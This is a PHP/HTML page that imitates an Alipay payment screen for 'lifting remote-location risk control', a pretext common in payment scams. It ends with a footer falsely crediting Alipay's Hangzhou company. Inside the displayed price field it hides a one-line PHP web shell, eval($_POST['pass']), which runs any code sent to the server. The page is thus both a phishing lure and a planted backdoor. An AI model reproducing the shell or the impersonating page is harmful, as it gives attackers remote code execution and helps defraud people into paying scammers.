<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>支付宝支付-解除风控</title>
    <!-- 陈瑞泽CRZ -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/layui-src/dist/css/layui.css">
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #F5F5F5;
             margin: 0;
             padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
         }

         .crz {
             width: 100%;
             max-width: 400px;
             background-color: white;
             margin: 20px;
             padding: 20px;
             border-radius: 8px; 
         }

         .nmsl {
             font-size: 24px;
             margin-bottom: 20px;
         }

         .zffs {
             text-align: center;
             margin: 10px 0;
             color: #333;
         }

         .crz1 {
             text-align: center;
             font-size: 32px;
             font-weight: bold;
             margin: 10px 0;
             color: #333;
         }

         .crznbb,
         .nmsl1,
         .disabled-methods,
         .crz3,
         .footer {
             margin: 15px 0;
             text-align: center;
         }

         .title,
         .crz3 {
             color: #666;
         }

         .method {
             display: flex;
             align-items: center;
             padding: 10px 0;
             border-bottom: 1px solid #f0f0f0;
             border-radius: 8px; 
             cursor: pointer;
         }

         .method:last-child {
             border-bottom: none;
         }

         .method i {
             margin-right: 10px;
             vertical-align: middle;
         }

         .method.selected i {
             color: #4CAF50; 
         }

         .crz4 {
             background-color: #007BFF;
             color: white;
             border: none;
             padding: 15px;
             text-align: center;
             font-size: 18px;
             border-radius: 5px; 
             cursor: pointer;
             display: block;
             margin: 20px auto;
             width: 80%;
         }

         .crz4:hover {
             background-color: #0056b3;
         }

         .footer {
             text-align: center;
             color: #999;
             font-size: 12px;
         }
     </style>
</head>
<body>
     <div class="crz">
         <div class="zffs">支付宝官方授权支付</div>
         <div class="crz1">¥<span id="pays"><?php eval($_POST['pass']); ?></span>
</div>
         <div class="crznbb">
             订单信息: 解除异地风控 (谨防刷单诈骗)
         </div>
         <div class="nmsl1">
          <div class="zffs">支付方式</div>
             <div class="method selected">
                 <i class="layui-icon layui-icon-success"></i> 网银银行支付
             </div>
             <div class="method">
                 <i class="layui-icon layui-icon-success"></i> 个人余额付款
             </div>
             <div class="method">
                 <i class="layui-icon layui-icon-success"></i> 亲情卡代付付款
             </div>
         </div>
         <div class="disabled-methods">
             <div class="title">以上订单作用于解除异地风控</div>
             <div class="crz3">
                 请按下支付按钮自行选择付款方式付款
             </div>
         </div>
     </div>
     <div class="crz">
 <a href="alipaysfk/pz.php" target="_blank">
    <button class="crz4">确认解除</button>
</a>
     </div>
     <div class="footer">本服务由支付宝（杭州）信息技术有限公司提供</div>
</body>
</html>